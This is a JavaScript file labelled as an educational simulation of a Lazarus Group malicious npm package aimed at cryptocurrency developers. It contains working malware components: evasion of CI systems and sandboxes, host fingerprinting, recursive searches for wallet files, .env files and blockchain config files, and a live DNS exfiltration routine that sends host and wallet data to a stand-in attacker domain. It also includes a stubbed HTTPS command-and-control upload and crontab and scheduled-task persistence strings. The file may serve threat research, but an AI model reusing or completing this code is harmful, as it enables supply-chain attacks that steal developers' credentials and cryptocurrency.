// Lazarus Group - Supply Chain Attack via npm Package
// Demonstrates malicious npm preinstall hook for targeting crypto developers
// MITRE ATT&CK: T1195.002 (Compromise Software Supply Chain)

// For educational and research purposes only
// Author: Nour A
// Reference: https://blog.phylum.io/lazarus-group-npm-attack

const https = require('https');
const http = require('http');
const os = require('os');
const path = require('path');
const fs = require('fs');
const { execSync, spawn } = require('child_process');
const crypto = require('crypto');
const dns = require('dns');

// ---- Configuration ----
const C2_HOST = 'c2.example.com';
const C2_PORT = 443;
const XOR_KEY = Buffer.from('4c415a41525553', 'hex'); // "LAZARUS"
const BEACON_INTERVAL = 30000;

// ---- Anti-Analysis ----

function detectSandbox() {
    /**
     * Check for sandbox/analysis environments.
     * Lazarus packages abort if running in CI/CD or security sandboxes.
     */
    const indicators = {
        ci: ['CI', 'CONTINUOUS_INTEGRATION', 'GITHUB_ACTIONS',
            'JENKINS_URL', 'TRAVIS', 'CIRCLECI', 'GITLAB_CI',
            'BUILD_NUMBER', 'BUILDKITE'],
        sandbox: ['SANDBOX', 'ANALYSIS', 'MALWARE', 'VIRUS'],
        vm: ['VBOX', 'VMWARE', 'VIRTUAL'],
    };

    for (const [category, vars] of Object.entries(indicators)) {
        for (const envVar of vars) {
            if (process.env[envVar]) {
                return { detected: true, category, variable: envVar };
            }
        }
    }

    // check hostname patterns
    const hostname = os.hostname().toLowerCase();
    const suspiciousHostnames = ['sandbox', 'analysis', 'malware',
        'virus', 'test', 'vm-'];
    for (const pattern of suspiciousHostnames) {
        if (hostname.includes(pattern)) {
            return { detected: true, category: 'hostname', variable: hostname };
        }
    }

    // check CPU count (sandboxes often have 1-2 cores)
    if (os.cpus().length <= 1) {
        return { detected: true, category: 'cpu', variable: 'single_core' };
    }

    // check uptime (freshly booted VMs)
    if (os.uptime() < 120) {
        return { detected: true, category: 'uptime', variable: 'fresh_boot' };
    }

    return { detected: false };
}


function fingerprint() {
    /**
     * Gather host fingerprint for targeting validation.
     * Lazarus only deploys second stage on interesting targets.
     */
    const info = {
        hostname: os.hostname(),
        platform: os.platform(),
        arch: os.arch(),
        release: os.release(),
        user: os.userInfo().username,
        home: os.homedir(),
        cpus: os.cpus().length,
        memory: Math.round(os.totalmem() / (1024 * 1024 * 1024)) + 'GB',
        uptime: Math.round(os.uptime() / 3600) + 'h',
        cwd: process.cwd(),
        nodeVersion: process.version,
        npmVersion: tryExec('npm --version'),
        pid: process.pid,
    };

    // check for interesting directories (crypto development)
    const interestingDirs = [
        '.ethereum', '.bitcoin', '.solana', '.near',
        'hardhat', 'truffle', 'foundry',
        '.ssh', '.aws', '.kube',
    ];

    info.interesting = [];
    for (const dir of interestingDirs) {
        const fullPath = path.join(os.homedir(), dir);
        if (fs.existsSync(fullPath)) {
            info.interesting.push(dir);
        }
    }

    // check for crypto-related env vars
    const cryptoVars = ['INFURA_KEY', 'ALCHEMY_KEY', 'ETHERSCAN_API_KEY',
        'PRIVATE_KEY', 'MNEMONIC', 'WALLET_CONNECT'];
    info.cryptoEnv = [];
    for (const envVar of cryptoVars) {
        if (process.env[envVar]) {
            // don't exfiltrate the actual value, just the name
            info.cryptoEnv.push(envVar);
        }
    }

    return info;
}


function tryExec(cmd) {
    try {
        return execSync(cmd, { timeout: 5000 }).toString().trim();
    } catch {
        return 'unknown';
    }
}


// ---- Crypto Operations ----

function xorEncrypt(data, key) {
    const buf = Buffer.from(data);
    const out = Buffer.alloc(buf.length);
    for (let i = 0; i < buf.length; i++) {
        out[i] = buf[i] ^ key[i % key.length];
    }
    return out;
}


function generateSessionKey() {
    return crypto.randomBytes(16);
}


// ---- Exfiltration Methods ----

function exfilDNS(data) {
    /**
     * DNS-based exfiltration (most stealthy).
     * Encode data in subdomain labels.
     */
    const encoded = Buffer.from(JSON.stringify(data)).toString('hex');
    // split into 60-char chunks (DNS label max = 63)
    const chunks = encoded.match(/.{1,60}/g) || [];
    const sessionId = crypto.randomBytes(4).toString('hex');

    console.log(`  [DNS] Exfiltrating ${chunks.length} chunks via DNS...`);

    for (let i = 0; i < Math.min(chunks.length, 10); i++) {
        const subdomain = `${chunks[i]}.${i}.${sessionId}.d.${C2_HOST}`;
        dns.lookup(subdomain, (err) => {
            // error expected (domain doesn't exist), data is in the query itself
        });
    }
}


function exfilHTTPS(data) {
    /**
     * HTTPS POST exfiltration (higher bandwidth).
     */
    const encrypted = xorEncrypt(JSON.stringify(data), XOR_KEY);
    const encoded = encrypted.toString('base64');

    const postData = JSON.stringify({
        type: 'telemetry',
        version: '1.0.2',
        data: encoded,
    });

    const options = {
        hostname: C2_HOST,
        port: C2_PORT,
        path: '/api/v1/telemetry',
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Content-Length': Buffer.byteLength(postData),
            'User-Agent': 'npm/9.8.1 node/v18.17.1',
        },
        rejectUnauthorized: false,
        timeout: 10000,
    };

    console.log(`  [HTTPS] POST to ${C2_HOST}:${C2_PORT} (${postData.length} bytes)`);

    // NOTE: this does NOT actually connect to any C2
    // in a real attack, this would use https.request()
}


// ---- Persistence ----

function installPersistence() {
    /**
     * Install persistence via npm global package or cron.
     */
    const platform = os.platform();
    let method = 'none';

    if (platform === 'win32') {
        // scheduled task
        const taskXml = `
        <Task>
          <Triggers><LogonTrigger><Enabled>true</Enabled></LogonTrigger></Triggers>
          <Actions><Exec>
            <Command>node</Command>
            <Arguments>${__filename}</Arguments>
          </Exec></Actions>
        </Task>`;
        method = 'scheduled_task';
        console.log('  [+] Would create scheduled task for persistence');
    } else {
        // crontab
        const cronLine = `@reboot node ${__filename} > /dev/null 2>&1`;
        method = 'crontab';
        console.log('  [+] Would add crontab entry for persistence');
    }

    return method;
}


// ---- Wallet Stealing ----

function searchForWalletFiles() {
    /**
     * Search for cryptocurrency wallet files and seed phrases.
     */
    const homeDir = os.homedir();
    const results = {
        walletFiles: [],
        envFiles: [],
        configFiles: [],
    };

    // wallet file patterns
    const walletPatterns = [
        { name: 'MetaMask Vault', path: '.config/google-chrome/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn' },
        { name: 'Keystore', path: '.ethereum/keystore' },
        { name: 'Bitcoin', path: '.bitcoin/wallet.dat' },
        { name: 'Solana', path: '.config/solana/id.json' },
    ];

    for (const wp of walletPatterns) {
        const fullPath = path.join(homeDir, wp.path);
        if (fs.existsSync(fullPath)) {
            results.walletFiles.push(wp.name);
        }
    }

    // search for .env files with secrets
    function searchEnvFiles(dir, depth) {
        if (depth > 3) return;
        try {
            const entries = fs.readdirSync(dir, { withFileTypes: true });
            for (const entry of entries) {
                if (entry.name.startsWith('.') && entry.name !== '.env') continue;
                const fullPath = path.join(dir, entry.name);
                if (entry.isFile() && (entry.name === '.env' ||
                    entry.name === '.env.local' ||
                    entry.name === '.env.production')) {
                    results.envFiles.push(fullPath);
                } else if (entry.isDirectory() && !entry.name.startsWith('node_modules')) {
                    searchEnvFiles(fullPath, depth + 1);
                }
            }
        } catch { }
    }

    searchEnvFiles(homeDir, 0);

    // hardhat/truffle config files
    const configPatterns = ['hardhat.config.js', 'hardhat.config.ts',
        'truffle-config.js', 'foundry.toml'];
    function searchConfigs(dir, depth) {
        if (depth > 3) return;
        try {
            const entries = fs.readdirSync(dir, { withFileTypes: true });
            for (const entry of entries) {
                if (configPatterns.includes(entry.name)) {
                    results.configFiles.push(path.join(dir, entry.name));
                }
                if (entry.isDirectory() && !entry.name.startsWith('.') &&
                    entry.name !== 'node_modules') {
                    searchConfigs(path.join(dir, entry.name), depth + 1);
                }
            }
        } catch { }
    }

    searchConfigs(homeDir, 0);

    return results;
}


// ---- Main ----

function main() {
    console.log('='.repeat(60));
    console.log('LAZARUS GROUP - SUPPLY CHAIN ATTACK MODULE');
    console.log('Malicious npm Package Simulation');
    console.log('='.repeat(60));
    console.log();
    console.log('[!] FOR EDUCATIONAL AND RESEARCH PURPOSES ONLY');
    console.log();

    // Stage 1: Anti-analysis
    console.log('[STAGE 1] Environment Analysis');
    console.log('-'.repeat(50));
    const sandbox = detectSandbox();
    if (sandbox.detected) {
        console.log(`  [!] Sandbox detected: ${sandbox.category} (${sandbox.variable})`);
        console.log('  [!] In a real attack, execution would abort here');
    } else {
        console.log('  [+] No sandbox indicators found');
    }
    console.log();

    // Stage 2: Fingerprinting
    console.log('[STAGE 2] Host Fingerprinting');
    console.log('-'.repeat(50));
    const fp = fingerprint();
    console.log(`  Hostname: ${fp.hostname}`);
    console.log(`  Platform: ${fp.platform} ${fp.arch}`);
    console.log(`  User: ${fp.user}`);
    console.log(`  Node: ${fp.nodeVersion}`);
    console.log(`  Interesting dirs: ${fp.interesting.join(', ') || 'none'}`);
    console.log(`  Crypto env vars: ${fp.cryptoEnv.join(', ') || 'none'}`);
    console.log();

    // Stage 3: Wallet search
    console.log('[STAGE 3] Cryptocurrency Wallet Search');
    console.log('-'.repeat(50));
    const wallets = searchForWalletFiles();
    console.log(`  Wallet files: ${wallets.walletFiles.length}`);
    for (const w of wallets.walletFiles) {
        console.log(`    [FOUND] ${w}`);
    }
    console.log(`  .env files: ${wallets.envFiles.length}`);
    for (const e of wallets.envFiles.slice(0, 5)) {
        console.log(`    [FOUND] ${e}`);
    }
    console.log(`  Config files: ${wallets.configFiles.length}`);
    console.log();

    // Stage 4: Exfiltration demo
    console.log('[STAGE 4] Exfiltration Demonstration');
    console.log('-'.repeat(50));
    exfilDNS({ hostname: fp.hostname, wallets: wallets.walletFiles });
    exfilHTTPS(fp);
    console.log();

    // Stage 5: Persistence
    console.log('[STAGE 5] Persistence Installation');
    console.log('-'.repeat(50));
    const method = installPersistence();
    console.log(`  Method: ${method}`);
    console.log();

    console.log('='.repeat(60));
    console.log('[+] SUPPLY CHAIN ATTACK SIMULATION COMPLETE');
    console.log('  Techniques demonstrated:');
    console.log('  - CI/CD and sandbox detection');
    console.log('  - Host fingerprinting for target validation');
    console.log('  - Cryptocurrency wallet and key file discovery');
    console.log('  - DNS and HTTPS exfiltration channels');
    console.log('  - Cross-platform persistence installation');
    console.log('='.repeat(60));
}

main();
